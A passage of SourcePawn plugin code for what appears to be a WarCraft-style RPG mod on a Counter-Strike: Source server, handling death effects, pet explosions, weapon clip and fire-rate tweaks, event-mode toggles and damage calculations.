  new Float:location[3];
  GetClientAbsOrigin(userid,location);
  new Float:distance=750.0;
  amount=GetNearClients("@all",location,targets,distance);
  for (new x=0;x<=(amount-1);x++)
  {
    if(GetClass(targets[x])==7)
    {
      if(GetLevel(targets[x])>=24)
      {
        if(wcGetTalentLevel(targets[x],2,1,2)>0)
        {
          wcGetTalentInfo(7,2,1,2,targets[x],"chance",line);
          new chance = StringToInt(line);
          new rand = GetRandomInt(1,100);
          if(chance >= rand)
          {
            decl String:harvestname[255];
            GetClientName(userid,harvestname,sizeof(harvestname));
            SetHarvest(targets[x], GetHarvest(targets[x])+1);
            WCMessage(targets[x],"soul harvest gain",targets[x],harvestname,GetHarvest(targets[x]));
          }
          else
          {
            new team=GetClientTeam(userid);
            new teamx=GetClientTeam(targets[x]);
            if(team==2 && teamx == 3)
            {
              decl String:harvestname[255];
              GetClientName(userid,harvestname,sizeof(harvestname));
              SetHarvest(targets[x], GetHarvest(targets[x])+1);
              WCMessage(targets[x],"soul harvest gain",targets[x],harvestname,GetHarvest(targets[x]));
            }
            if(team==3 && teamx == 2)
            {
              decl String:harvestname[255];
              GetClientName(userid,harvestname,sizeof(harvestname));
              SetHarvest(targets[x], GetHarvest(targets[x])+1);
              WCMessage(targets[x],"soul harvest gain",targets[x],harvestname,GetHarvest(targets[x]));
            }
          }
        }
        else
        {
          new team=GetClientTeam(userid);
          new teamx=GetClientTeam(targets[x]);
          if(team==2 && teamx == 3)
          {
            decl String:harvestname[255];
            GetClientName(userid,harvestname,sizeof(harvestname));
            SetHarvest(targets[x], GetHarvest(targets[x])+1);
            WCMessage(targets[x],"soul harvest gain",targets[x],harvestname,GetHarvest(targets[x]));
          }
          if(team==3 && teamx == 2)
          {
            decl String:harvestname[255];
            GetClientName(userid,harvestname,sizeof(harvestname));
            SetHarvest(targets[x], GetHarvest(targets[x])+1);
            WCMessage(targets[x],"soul harvest gain",targets[x],harvestname,GetHarvest(targets[x]));
          }
        }
      }
    }
  }
  SetHarvest(userid, 0);
  g_PlayerIsDead[userid]=true;
  return Plugin_Continue;
}
public PetDied(pet,owner) {
  g_ff_ownsPet[owner]= -1;

  //start corpseparty
  if(IsClientInGame(owner) && GetClass(owner) == 8 && HasGlyph(owner, GLYPH_DK_CORPSEPARTY))
  {
    new Float:location[3], Float:loc2[3];
    GetClientAbsOrigin(pet,location);
    EmitAmbientSound("wc/spells/corpseexplosionnew.wav",location);
    new Float:distance=400.0;
    new Float:multi=0.70;
    new Float:basedmg=25.0;
    new targets[MAXPLAYERS];
    new team=GetClientTeam(pet);
    new amount;
    if(team==2)
    amount=GetNearClients("@ct",location,targets,distance);
    if(team==3)
    amount=GetNearClients("@t",location,targets,distance);
    decl String:name[255];
    new String:stargets[255];
    new dmg=(RoundToNearest(basedmg + (RoundToNearest(float(GetDamage(owner))) * multi)));
    for (new x=0;x<=(amount-1);x++)
    {
      GetClientName(targets[x],name,sizeof(name));
      if(x>0)
      {
        Format(stargets,sizeof(stargets),"%s, %s",stargets,name);
      }
      else
      {
        Format(stargets,sizeof(stargets),"%s %s",stargets,name);
      }
    }
    if(amount==0)
    Format(stargets,sizeof(stargets),"%T","nobody",pet);
    //EmitAmbientSound("wc/spells/corpseparty.wav",location);
    for (new x=0;x<=(amount-1);x++)
    {
      new zdmg = dmg;
      GetClientAbsOrigin(targets[x],loc2);
      new Float:locdis=GetDistanceBetween(location,loc2);
      if(locdis >= 350)
      {
        zdmg = RoundToNearest(zdmg*0.500);
      }
      if((locdis >= 250) && (350 > locdis))
      {
        zdmg = RoundToNearest(zdmg*0.700);
      }
      if((locdis >= 150) && (250 > locdis))
      {
        zdmg = RoundToNearest(zdmg*0.850);
      }
      else
      {
        zdmg = RoundToNearest(float(zdmg)* (400.0 / (150.0 + GetDistanceBetween(location,loc2))));
      }
      if(GetClass(owner)==8 && wcGetTalentLevel(owner,3,4,2)>0)
        zdmg = RoundToNearest(float(zdmg)*1.5);
      decl String:vicMsg[300];
      Format(vicMsg,sizeof(vicMsg),"%T","corpseparty target", targets[x]);
      wcSpellDamage(targets[x],owner,zdmg, "", vicMsg,"Corpse Party Glyph");
      BloodSpray(targets[x]);
    }
    WCMessage(pet,"corpseparty",pet,stargets,dmg);
  }

}

public SetAutoCrit(client,bool:crit)
{
  bAutoCrit[client]=crit;
}

public GetAutoCrit(client)
{
  return bAutoCrit[client];
}

dealExtraHit(attacker, victim, damage, String:weaponname[], String:source[])
{
  new Handle:Revent=CreateEvent("player_hurt");
  SetEventInt(Revent,"userid",GetClientUserId(victim));
  SetEventInt(Revent,"attacker",GetClientUserId(attacker));
  SetEventInt(Revent,"dmg_health",damage);
  SetEventString(Revent,"weapon",weaponname);
  SetEventInt(Revent,"hitgroup",2);
  SetEventBool(Revent,"bonushit",true);
  SetEventString(Revent,"bonussource",source);
  FireEvent(Revent);
}

public Action:PlayerReloadEvent(Handle:event,const String:name[],bool:dontBroadcast)
{
  new userid=GetClientOfUserId(GetEventInt(event,"userid"));
  if((userid>0) && (userid<=GetMaxClients()))
  {
    ClientClip[userid][2]=0;
  }
}

public OnGameFrame()
{
  /* Run next frame damages */
  /*while(GetArraySize(g_dmgArray) > 0)  {*/
  /*new Handle:pack = Handle:GetArrayCell(g_dmgArray, 0);*/
  /*RemoveFromArray(g_dmgArray, 0);*/
  /*TimerDmg(INVALID_HANDLE, pack);*/
  /*CloseHandle(pack);*/

  /*}*/

  checkHpChanges();
  BotTimer();
  if(IsBoss())
  {
    for(new i=1;i<=GetMaxClients();i++)
    {
      if(IsClientInGame(i))
      if(IsPlayerAlive(i) && (!IsFakeClient(i)))
      {
        new zomg = GetEntDataEnt2(i, ACTIVEWEAPON);
        if(IsValidEntity(zomg))
        SetEntData(zomg, CLIPOFFSET, 5, 4, true);
      }
    }
  }
  else
  {
    for(new i=1;i<=GetMaxClients();i++)
    {
      if(IsClientInGame(i))
      if(IsPlayerAlive(i) && (!IsFakeClient(i)))
      {
        new client = i;
        // Hook Landing
        if(g_ff_hookland[client]) {
          if(GetEntPropEnt(client, Prop_Send, "m_hGroundEntity") != -1) {
            UnhookLand(client);
            if(GetClass(client)==9)
              KickLand(client);
            else
              LeapLand(client);
          }
        }

        new zomg = GetEntDataEnt2(i, ACTIVEWEAPON);
        if(IsValidEntity(zomg))
        {
          //Punch function
          decl Float:vec[3];
          if(afterShoot[i] && g_vOffs_Punch != -1) {
            afterShoot[i]=false;
            GetEntDataVector(i, g_vOffs_Punch, vec);
            for(new y=0;y<3;y++)
            vec[y]*=(1.0 - GetAccuracy(i));
            SetEntDataVector(i,g_vOffs_Punch, vec);
          }
          new ammo=GetEntData(zomg, CLIPOFFSET, 4);
          if((zomg==ClientClip[i][0]) && (ClientClip[i][2]==0))
          {
            decl String:weapon[50];
            GetEdictClassname(zomg, weapon, sizeof(weapon));
            //weapon = weapon_xm1014
            //weapon = weapon_m3
            if((!StrEqual("weapon_xm1014",weapon))&&(!StrEqual("weapon_m3",weapon))&&(!StrEqual("weapon_c4",weapon)))
            if((ammo!=ClientClip[i][1]) && (ammo>6))
            {
              if(GetDualWieldSpecc(i)>0.0)
              {
                ammo+=RoundToNearest(float(ammo)*GetDualWieldSpecc(i));
              }
              new Float:speed=GetAttackSpeed(i);
              if(speed>1.0)
              {
                ammo=RoundToNearest(float(ammo)*speed*GetClientClipModifier(i));
              }
              SetEntData(zomg, CLIPOFFSET, ammo, 4, true);
            }
          }
          if(ammo==0)
          {
            ClientClip[i][2]=0;
          }
          ClientClip[i][0]=zomg;
          ClientClip[i][1]=ammo;
        }
      }
    }
  }
  if(g_iWeaponRateQueueLength)
  {
    decl ent, client, Float:time;
    new Float:enginetime = GetGameTime();

    for(new i = 0; i < g_iWeaponRateQueueLength; i++)
    if(IsValidEntity(g_iWeaponRateQueue[i][0]))
    {
      ent = g_iWeaponRateQueue[i][0];
      client = g_iWeaponRateQueue[i][1];
      new Float:g_flMultiplier=1.0 / wcClientsStats[GetPlayerID(client)][ATTACKSPEED];
      if(wcClientSealT[client]>GetTickedTime())  if(wcClientSeal[client]==7)
      {
        decl String:line[255];
        wcGetSpellInfo(4,7,"base",line);
        new Float:multi=StringToFloat(line);
        g_flMultiplier/=multi;
      }
      time = (GetEntDataFloat(ent,g_iOffs_NextPrimaryAttack) - enginetime) * g_flMultiplier;
      SetEntDataFloat(ent,g_iOffs_NextPrimaryAttack,time + enginetime,true);
    }

    g_iWeaponRateQueueLength = 0;
  }
}

public PreThinkHook(client)  {
  //Pre think of client
  if(!IsPlayerAlive(client))
  return;

}

public Action:TraceAttack(client, &attacker, &inflictor, &Float:damage, &damagetype)
{
  /*PrintToServer("trace attack");*/
  /*return Plugin_Continue;*/
  if(!IsPlayerAlive(client))  {
    LogError("Traceattack on dead client!");
    return Plugin_Handled;
  }
  if(GetClientHealth(client) <= 0)  {
    LogError("TraceAttack on no hp client!");
    return Plugin_Handled;
  }
  if(wcKillHandled)
  return Plugin_Continue;
  //if((attacker>0) && (attacker<=GetMaxClients()+1))
  if((attacker>0) && (attacker<=GetMaxClients()))
  {
    if(UnableToAttack[attacker] || IsPolymorphed(attacker))
    {
      wc_iPlayerHurtEvent=0;
      wc_aPlayerHurtEvent=0;
      return Plugin_Handled;
    }
    if((IsInvisible(client) || IsMageInvis(client)) && IsFakeClient(attacker)) {
      if(GetRandomInt(1,100) <= 100)  {
        decl String:name[30];
        GetClientName(attacker, name, sizeof(name));
        WCMessage(client, "bot misses", client, name);
        return Plugin_Handled;
      }
    }
    if(UnableToVictim[client])
    {
      decl String:name[255];
      GetClientName(client,name,sizeof(name));
      if(GetClass(client)==3)  //mage
      {
        if(SpendIceBlocks(client))
        {
          WCMessage(attacker,"iceblock to attacker",attacker,name);
          return Plugin_Handled;
        }
        else //ran out of iceblocks
        {
          WCMessage(client,"iceblock expired",client);
          UnableToVictim[client]=false;
        }
      }
      else  //not mage
      {
        if(GetClientTeam(client)!=GetClientTeam(attacker))
        {
          WCMessage(attacker,"unable to attack",attacker,name);
        }
        else
        {
        }
        return Plugin_Handled;
      }
    }
    if(GetConVarInt(convar_friendlyfire)==0)
    {
      if(GetClientTeam(client)==GetClientTeam(attacker))
      return Plugin_Continue;
    }
    new hp=GetClientHealth(client);
    new iDamage = RoundToCeil(damage);
    hp+=iDamage;
    wc_iPlayerHurtEvent=iDamage;
    wc_aPlayerHurtEvent=GetClientArmor(client);
    _gameSetHealth(client,hp);
    RemoveSprint(attacker);
  }
  return Plugin_Continue;
}

public WeaponFireEvent(Handle:event,const String:name[],bool:dontBroadcast)
{
  new id = GetClientOfUserId(GetEventInt(event,"userid"));
  if(IsMageInvis(id))
  SetMageInvis(id, false, true);
  new ent = GetEntDataEnt2(id,g_iOffs_ActiveWeapon);
  SetStealth(id, 0.0, true);
  ClientClip[id][2]=1;
  if(ent != -1)
  {
    //we need to wait a frame cuz the next attack time is not set yet
    g_iWeaponRateQueue[g_iWeaponRateQueueLength][0] = ent;
    g_iWeaponRateQueue[g_iWeaponRateQueueLength++][1] = id;
    afterShoot[id]=true;

  }
}

public Action:CommandJoinTeam(client, args)
{

  // Get the target team
  decl String:teamString[3];
  GetCmdArg(1, teamString, sizeof(teamString));
  new team = StringToInt(teamString);
  //Viewing slides
  if(g_ffSlideStep[client]>0)  {
    if(team==1)
    return Plugin_Continue;
    else {
      ChangeClientTeam(client,1);
      WCMessage(client,"finish viewing slides",client);
      return Plugin_Handled;
    }
  }

  //Check if server is blocked
  if(g_ServerPause)  {
    if(team==1)
    return Plugin_Continue;
    else {
      ChangeClientTeam(client,1);
      WCMessage(client,"wc server blocked team",client);
      return Plugin_Handled;
    }
  }
  //end
  // Check to see if the arena is enabled
  if(bArenaActive) {
    new bool:pass=TeamController(client,team);
    if(!pass)   {
      ChangeClientTeam(client,1);
      CheckArenaChange(client,false);
      return Plugin_Handled;
    }
  }
  if(!IsBoss() && !IsHNS())
  {
    return Plugin_Continue;
  }

  // Check to see if the client is valid
  if(!client || !IsClientInGame(client))
  {
    return Plugin_Continue;
  }

  // check admin immunity
  if(GetUserAdmin(client) != INVALID_ADMIN_ID)
  {
    return Plugin_Continue;
  }
  // Check for team locking concerns
  {
    // if autojoin force them to CT
    if(team == 0)
    {
      ChangeClientTeam(client, 3);
      return Plugin_Handled;
    }

    // check to see if the team they are switching to is the same as their assigned team
    if(team == 3)
    {
      ChangeClientTeam(client, 3);
      return Plugin_Handled;
    }
    if(team == 2)
    {
      Deny(client, "It's boss event, choose another team.");
      return Plugin_Handled;
    }
    // if we get to here it is safe
    return Plugin_Continue;
  }
}

Deny(client, const String:message[])
{
  if(!client || !IsClientInGame(client) || IsFakeClient(client))
  {
    return;
  }
  ClientCommand(client, "play buttons/button11.wav");
  PrintCenterText(client, message);
}

public HeroicModChanged(Handle:g_BossMod2, const String:oldValue[], const String:newValue[])
{
  new newv=StringToInt(newValue);
  if(!IsHeroic() && (newv==1))
  {
    for(new x=1;x<=GetMaxClients();x++)
    if(IsClientInGame(x))
    WCMessage(x,"Announce Heroic",x);
    SetHeroic(true);
  }
  if((newv==0) && IsHeroic())
  {
    for(new x=1;x<=GetMaxClients();x++)
    if(IsClientInGame(x))
    WCMessage(x,"Announce Heroic0",x);
    SetHeroic(false);
  }
}
public TreasureHuntChanged(Handle:g_BossMod2, const String:oldValue[], const String:newValue[])
{
  new oldv=StringToInt(oldValue),newv=StringToInt(newValue);
  if((oldv==0) && (newv==1))
  {
    for(new x=1;x<=GetMaxClients();x++)
    if(IsClientInGame(x))
    WCMessage(x,"Announce Treasure Hunt",x);
    SetTreasureHunt(true);
  }
  if((newv==0) && (oldv==1))
  {
    for(new x=1;x<=GetMaxClients();x++)
    if(IsClientInGame(x))
    WCMessage(x,"Announce Treasure Hunt0",x);
    SetTreasureHunt(false);
  }
}
public CtfChanged(Handle:g_BossMod2, const String:oldValue[], const String:newValue[])
{
  new oldv=StringToInt(oldValue),newv=StringToInt(newValue);
  if((oldv==0) && (newv==1))
  {
    for(new x=1;x<=GetMaxClients();x++)
    if(IsClientInGame(x))
    WCMessage(x,"Announce Ctf",x);
    SetCtf(true);
  }
  if((newv==0) && (oldv==1))
  {
    for(new x=1;x<=GetMaxClients();x++)
    if(IsClientInGame(x))
    WCMessage(x,"Announce Ctf0",x);
    SetCtf(false);
  }
}


public BossModChanged(Handle:g_BossMod2, const String:oldValue[], const String:newValue[])
{
  new oldv=StringToInt(oldValue),newv=StringToInt(newValue);
  if((oldv==0) && (newv==1))
  {
    TriggerPlugins(false);
    new Handle:round=FindConVar("mp_roundtime");
    g_RoundTime=GetConVarFloat(round);
    SetConVarFloat(round, 9.0);
    CloseHandle(round);
    for(new x=1;x<=GetMaxClients();x++)
    if(IsClientInGame(x))
    WCMessage(x,"Announce Boss",x);
    SetBossGlobal(true);
  }
  if((newv==0) && (oldv==1))
  {
    new Handle:round=FindConVar("mp_roundtime");
    SetConVarFloat(round, g_RoundTime);
    new totalxp;
    for(new x=1;x<=GetMaxClients();x++)
    if(IsClientInGame(x))
    {
      WCMessage(x,"Announce Boss0",x);
      if(GetBoss(x)>0)
      {
        KvRewind(wcbossdrop);
        decl String:temp[9];
        IntToString(GetBoss(x),temp,sizeof(temp));
        KvJumpToKey(wcbossdrop,temp);
        totalxp+=KvGetNum(wcbossdrop,"totalxp");
        totalxp+=g_BossEndXP;
        g_BossEndXP=0;
      }
    }
    if(totalxp>0)
    {
      CreateTimer(60.0,GiveXpTimer,totalxp);
      for(new x=1;x<=GetMaxClients();x++)
      if(IsClientInGame(x))
      WCMessage(x,"60 sec for xp",x,totalxp);
    }
    CloseHandle(round);
    TriggerPlugins(true);
    SetBossGlobal(false);
  }
}

public Action:GiveXpTimer(Handle:timer, any:totalxp)
{
  if(totalxp>0)
  {
    ServerCommand("wc_xp @all %i",totalxp);
  }
  return Plugin_Stop;
}

stock GetLiteralString(const String:cmd[],String:buffer[],maxlength)
{
  strcopy(buffer,strlen(cmd)+1,cmd);
  ReplaceString(buffer,maxlength,"\"","");
}

//Has to be fast
public Action:TransmitHpBarHook(entity, client) {
  //HP Bars code
  if(IsClientInGame(client))  {
    //Seach if entity is a hp bar
    new bool:found=false;
    for(new i=1; i<=GetMaxClients();i++)  {
      if(entity == g_eHp[i])  {
        found=true;
        /*PrintToServer("found entity %d owner %d", entity, i);*/
        //We found hp bar, now find out whether we display it

        //Is Healer?
        /*if(!IsHealer(client)) return Plugin_Handled;*/

        new target = i;
        if(!IsClientInGame(target) || !IsPlayerAlive(target)) {
          return Plugin_Handled;
        }
        //Do not send to yourself
        if(target == client) {
          /*PrintToServer("Blocking transmit of entity %d owner %d", entity, target);*/
          return Plugin_Handled;
        }

        //Compare teams
        //Is Boss?
        new bool:isBoss= IsBoss()  && (GetBoss(target) > 0);

        if(!isBoss && (GetClientTeam(client) != GetClientTeam(target)) )  {
          /*PrintToServer("Blocking transmit of entity %d owner %d", entity, target);*/
          return Plugin_Handled;
        }



        //We found the owner of entity, no need to search further
        break;
      }
    }
    if(!found)  {
      LogError("[WC] Unhooking hp bar which was supposed to not exist.");
      /*SDKUnhook(entity, SDKHook_SetTransmit, TransmitHpBarHook);*/
      return Plugin_Handled;
    }
  }

  return Plugin_Continue;
}
public Action:SetTransmitHook(entity, client) {
  //Invisibility code
  if(IsClientConnectedIngameAlive(client) && IsClientConnectedIngameAlive(entity) && entity != client){
    if(IsMageInvis(client) && GetClass(client)!=2) if(GetClientTeam(client) != GetClientTeam(entity))  {
      return Plugin_Handled;
    }
    if(IsMageInvis(entity)) if(GetClientTeam(client) != GetClientTeam(entity))  {
      return Plugin_Handled;
    }
  }


  return Plugin_Continue;


}

stock bool:IsClientConnectedIngameAlive(client) {
  if(client < 1)  return false;
  if(client > GetMaxClients())  return false;
  if(!IsClientInGame(client)) return false;
  if(!IsPlayerAlive(client))  return false;
  return true;
}


public Action:PlayerHurtEvent(Handle:event,const String:name[],bool:dontBroadcast)
{
  /*return Plugin_Continue;*/
  if(wcKillHandled2)  {
    wcKillHandled2=false;
    return Plugin_Continue;
  }
  decl String:weaponname[25], String:spellname[25];
  decl String:line[255];
  new bool:headshot=false;
  new victim=GetClientOfUserId(GetEventInt(event,"userid"));
  new attacker=GetClientOfUserId(GetEventInt(event,"attacker"));
  new redirectTo;
  new redirection = GetRedirection(attacker, redirectTo);
  new bool:redirected=false;
  new bonushit=0;
  new Float:damagemulti=1.0;
  new Float:talentcritdamagebonus=0.0;
  new String:amsg[350], String:vmsg[350];
  GetEventString(event, "amsg", amsg, sizeof(amsg));
  GetEventString(event, "vmsg", vmsg, sizeof(vmsg));
  GetEventString(event, "name", spellname, sizeof(spellname));
  new damage=GetEventInt(event,"dmg_health");
  GetEventString(event, "weapon", weaponname, sizeof(weaponname));
  new vic=victim, att=attacker;
  new bool:acast=true, bool:vcast=true;
  SetCombat(attacker, 8);
  SetCombat(victim,   8);

  new item[UniqueItem];
  GetCharItem(item, attacker, 22);
  if(item[Item_defId]==25236 && 80>GetLevel(attacker))
  {
    if(10 >= GetRandomInt(1,100))
    {
      AddHaste(attacker, 35.0);
      wcRecalculateStats(attacker);
      new Handle:datapack4=CreateDataPack();
      WritePackCell(datapack4,attacker); // Write the attacker index of owner
      CreateTimer(8.0,Bladefist,datapack4,TIMER_HNDL_CLOSE);
      AddEMsgAff("bladefist",true);
    }
  }
  if(2 >= GetRandomInt(1,150))
  {
    GetCharItem(item, attacker, 16);
    if(item[Item_defId]==25237 && 80>GetLevel(attacker))
      wcRunSpell_7_4(4,7,attacker);
    GetCharItem(item, victim, 16);
    if(item[Item_defId]==25237 && 80>GetLevel(victim))
      wcRunSpell_7_4(4,7,victim);
  }
  GetCharItem(item, attacker, 22);
  if(item[Item_defId]==25238 && 80>GetLevel(attacker))
    if(5 >= GetRandomInt(1,100))
    {
      AddEMsgAff( "blinkstrike", true);
      damagemulti*=1.20;
    }
  GetCharItem(item, attacker, 22);
  if(item[Item_defId]==25239 && 80>GetLevel(attacker))
    if(7 >= GetRandomInt(1,100))
      if(GetClass(victim)!= 1 && GetClass(victim)!= 2 && GetClass(victim)!=8 && GetClass(victim)!= 9)
      {
        wcSetMana(victim,GetMana(victim)-20);
        AddEMsgAff( "fortishal", true);
      }
  GetCharItem(item, attacker, 22);
  if(item[Item_defId]==25244 && 80>GetLevel(attacker))
    if(6 >= GetRandomInt(1,100))
    {
      SetHolyPower(attacker, GetHolyPower(attacker)+1);
      AddEMsgAff( "lights vengeance", true);
    }
  GetCharItem(item, attacker, 22);
  if(item[Item_defId]==25245 && 80>GetLevel(attacker))
    if(20 >= GetRandomInt(1,100))
      {
        new heal = RoundToNearest(float(GetMaxHealth(attacker))*0.02);
        wcHeal(attacker,attacker,heal,0,true);
        AddEMsgAff( "truesilver champion", true);
      }
  GetCharItem(item, attacker, 22);
  if(item[Item_defId]==25250 && 80>GetLevel(attacker))
    if(9 >= GetRandomInt(1,100))
    {
      wcSpellDamage(victim, attacker, GetSpellDmg(attacker,0.045)+4, "", "",line);
      AddEMsgAff( "lightning bolt", true);
    }
  GetCharItem(item, victim, 20);
  if(item[Item_defId]==25251 && 80>GetLevel(victim))
    if(12 >= GetRandomInt(1,100))
    {
      SenJin(attacker,victim);
      AddEMsgAff( "senjin poison", true);
    }
  GetCharItem(item, attacker, 22);
  if(item[Item_defId]==25257 && 80>GetLevel(attacker))
    if(7 >= GetRandomInt(1,100))
      wcRunSpell_8_4(4,8,attacker,victim,true);
    
    
  if(PlayerHasBonusFast(attacker, Profession:Prof_ExtraDamage))
  damagemulti*=1.05;
  if(PlayerHasBonusFast(victim, Profession:Prof_ExtraDef))
  damagemulti*=0.95;
  if(GetStance(victim)==1)
    damagemulti*=0.92;
  if(GetEventBool(event,"bonushit"))
    bonushit=1;
  if(g_iRenewingGlyph[victim]>0)
    damagemulti*=1.00-(((g_iRenewingGlyph[victim]*0.025+0.025)*0.66)+0.017);

  new hpRestoreTo = victim;
  if((attacker > 0) && (victim > 0) && (redirection > 0) && (redirectTo > 0) )
  {
    SetRedirection(attacker, redirectTo, redirection-1);
    WCMessage(victim, "taunt dmg redirected", victim);
    victim = redirectTo;
    redirected=true;
  }

  if(strlen(amsg)==0)
  {
    acast=false;
    Format(amsg,sizeof(amsg),"%T","default dmg att", attacker);
  }

  if(strlen(vmsg)==0)
  {
    vcast=false;
    Format(vmsg,sizeof(vmsg),"%T","default dmg vic", victim);
  }
  new msgId = StartEMsg(amsg, vmsg, attacker, victim);
  MsgExist(msgId, acast,vcast);

  if(attacker!=0 && !UnableToVictim[victim])
  {
    new String:attName[20];
    GetClientName(attacker, attName,sizeof(attName));
    AddEMsgCaster(msgId, attName);
    new bool:bCS=false;

    if(redirected)
    {
      AddEMsgAff("taunt",true);
    }
    if(CheckRequirements(victim,2,1,2,3) && HasGlyph(victim, GLYPH_ROGUE_MASTEROS))
    {
      new weap = GetEntDataEnt2(victim, ACTIVEWEAPON);
      decl String:S_weapon[50];
      GetEdictClassname(weap, S_weapon, sizeof(S_weapon));
      if(StrEqual("weapon_knife",S_weapon))
      {
        wcGetTalentInfo(2,1,2,3,victim,"glyph",line);
        damagemulti*=1.0-StringToFloat(line);
      }
    }
    if (StrEqual(weaponname,"Spell",false)) //spell damage
    {
      if(IsMageInvis(attacker))
      SetMageInvis(attacker, false, true);
      new bool:isAoe=GetEventBool(event,"aoe");
      CalculateCrit(attacker,victim,true,spellname,bCS);
      new Float:penetration = 0.0;
      if(CheckRequirements(attacker, 8, 3, 1, 1)) {
        wcGetTalentInfo(8,3,1,1,attacker,"multi",line);
        new Float:talentMulti = StringToFloat(line);
        penetration += float(GetIgnoreArmor(attacker)) * talentMulti;
      }
      if(CheckRequirements(attacker,3,3,1,4))
      {
        wcGetTalentInfo(3,3,1,4,attacker,"multi",line);
        new Float:talentMulti = StringToFloat(line);
        penetration += GetResistance(victim) * talentMulti;
      }
      if(CheckRequirements(attacker,7,1,1,4) && isAoe)
      {
        wcGetTalentInfo(7,1,1,4,attacker,"multi",line);
        penetration+=GetResistance(victim)*StringToFloat(line);
      }
      /*if(CheckRequirements(attacker,7,3,1,4) && !isAoe)
      {
        wcGetTalentInfo(7,3,1,4,attacker,"multi",line);
        penetration+=GetResistance(victim)*StringToFloat(line);
      }*/
      damagemulti*=GetSpellReduction(victim,penetration);
      damagemulti*=GetWeaponModifier(weaponname,attacker);
      //Curse?
      if(hasCurse(attacker))
      damagemulti*=(1.0-getCursePower(attacker));
      damagemulti*=getDamageBuff(attacker);
      if(g_iCarry[attacker]>0)
        damagemulti*CTF_NERF;
      if(CheckRequirements(attacker,2,3,3,2))
      {
        new Float:currenthealth = float(wcGetHealth(victim)) / float(GetMaxHealth(victim));
        if(0.35 >= currenthealth)
        {
          wcGetTalentInfo(2,3,3,2,attacker,"dincrease",line);
          new Float:dincrease = StringToFloat(line);
          damagemulti*=dincrease;
          AddEMsgAff( "dispatch msg", true);
        }
      }
      wcGetSpellInfo(4,6,"name",line);
      if(GetClass(attacker)==4 && bCS && StrEqual(spellname,line,false))
        wcRunTalent_4_DivineBlood(attacker);
        
      new itemz[UniqueItem];
      GetCharItem(itemz, attacker, 14);
      if(itemz[Item_defId]==25253 && 80>GetLevel(attacker) && 4 >= GetRandomInt(1,100))
      {
        CreateTimer(1.5,DestroyMageInvis,attacker);
        if(Defuser==attacker)
        {
          new bombent = FindEntityByClassname(-1,"planted_c4");
          if (bombent>-1)
          {

            WCMessage(attacker, "cant defuse", attacker);
            CreateTimer(0.2,DefuseDelay,0);
          }
        }
        SetMageInvis(attacker,true, false, false);  //No overlay effects
        new Float:location[3];
        GetClientAbsOrigin(attacker,location);
        EmitAmbientSound("wc/spells/invisibility.wav",location);
        WCMessage(attacker,"doomrel",attacker,1.5);
      }
      GetCharItem(itemz, attacker, 22);
      if(itemz[Item_defId]==25255 && 80>GetLevel(attacker) && 1 >= GetRandomInt(1,100))
      {
        if((GetClass(victim)!=8 && wcGetTalentLevel(victim,2,2,1)!=0) || (!UnableToAttack[victim]))
        {
        }
        else
        {
          new ticks = 10;
          new Float:tickdelay = 0.2;
          new power = 700;
          new breakdmg = 60;
          new effid=CreateEffectData(victim,attacker,ticks,power,breakdmg,0,RoundToNearest(ticks*0.5),7,g_RoundCount,0);
          if (tickdelay==0.0 || ticks == 0)
          {
            LogError("ERROR: fear spell corrupted.");
            DeleteEffectData(effid);
          }
          else if(effid!=0)
          {
            SetFearDmg(victim,breakdmg);
            SetFear(victim,effid);
            SetSilence(victim,4 * 0.5,true);
            g_fearspeed[victim][0]=GetClientSpeed(victim);
            g_fearspeed[victim][1]=GetClientSpeed(victim);
            new color2[4]={53,55,149,255};
            FadeEffect(victim,2,300,50,color2);
            effectsdata[effid][6] = 1;
            CreateTimer(tickdelay, EffectFearAction, effid, TIMER_REPEAT);
          }
        }
      }
      if(bCS)
      {
        new item2[UniqueItem];
        GetCharItem(item2, attacker, 22);
        if(item2[Item_defId]==25235 && 80>GetLevel(attacker))
        {
          if(18 >= GetRandomInt(1,100))
          {
            wcPhysicalDamage(victim,attacker,12, "", "",true,line);
            AddEMsgAff("split",true);
          }
        }
        wcGetTalentCritDamageBonus(attacker,spellname,talentcritdamagebonus,true);
        damagemulti*=(1.50+talentcritdamagebonus)*(1.0 - GetMinusCrit(victim));
        wcRunTalentSpellCrit(attacker,victim,spellname,damage,damagemulti,isAoe);
        AddEMsgAff("critical msg",true);
      }
      wcRunEffects(attacker,victim,damage,true,true,1,0,spellname,bonushit,bCS);
      wcRunEffects(attacker,victim,damage,true,true,2,0,spellname,bonushit,bCS);
      damage=RoundToNearest(damagemulti*damage);
      if(GetFear(victim))
      {
        if(GetFearDmg(victim)>damage)
        SetFearDmg(victim,GetFearDmg(victim)-damage);
        else
        RemoveFear(victim);
      }

      if(GetFrostNovaFreeze(victim))
      {
        if(GetFrostNovaFreezeDmg(victim)>damage)
        SetFrostNovaFreezeDmg(victim,GetFrostNovaFreezeDmg(victim)-damage);
        else
        RemoveFrostNovaFreeze(victim);
      }

      RunSealsHit(attacker,victim,damage,2,1.0,bCS,true);
      LowLvlDmg(victim,attacker,damage,true);
      new vlevel = GetLevel(victim);
      new alevel = GetLevel(attacker);
      if(alevel==vlevel && vlevel>=85) {
        damage = KpdRule(attacker, damage, 3, 1);
        damage = KpdRule(victim, damage, 2, 1);
      }
      else
      {
        if(alevel >= vlevel)
          damage = KpdRule(attacker, damage, 3);
        if(vlevel >= alevel)
          damage = KpdRule(victim, damage, 2);
      }
      wcRunEffects(attacker,victim,damage,true,true,3,0,spellname,bonushit,bCS);
      if(GetClass(victim)==1)
      GenerateRage(victim,damage,true);
    }
    else if(StrEqual(weaponname,"Physical",false)) //physical damage
    {
      new bool:red = GetEventBool(event, "reduction");
      if(GetStance(attacker)==2)
        damagemulti *= 1.1;
      //Curse?
      if(hasCurse(attacker))
      damagemulti*=(1.0-getCursePower(attacker));
      damagemulti*=getDamageBuff(attacker);
      if(g_iCarry[attacker]>0)
        damagemulti*CTF_NERF;
      new Float:currenthealth = float(wcGetHealth(victim)) / float(GetMaxHealth(victim));
      if(CheckRequirements(attacker,2,3,3,2))
      {
        if(0.35 >= currenthealth)
          g_iDispatch[victim]+=1;
      }
      if(currenthealth > 0.35)
        g_iDispatch[victim]=0;
      CalculateCrit(attacker,victim,false,"Physical",bCS);

      if(bCS) {
        damagemulti*=1.5*(1.0 - GetMinusCrit(victim));
        AddEMsgAff( "critical msg", true);        //do we rly want it here?
      }
      new armor;
      if(CheckRequirements(attacker,2,2,3,2))
      {
        wcGetTalentInfo(2,2,3,2,attacker,"multi",line);
        armor=RoundToNearest(float(GetArmor(victim))*StringToFloat(line))-(GetIgnoreArmor(attacker)+GetBonusIgnoreArmor(attacker));
      }
      else
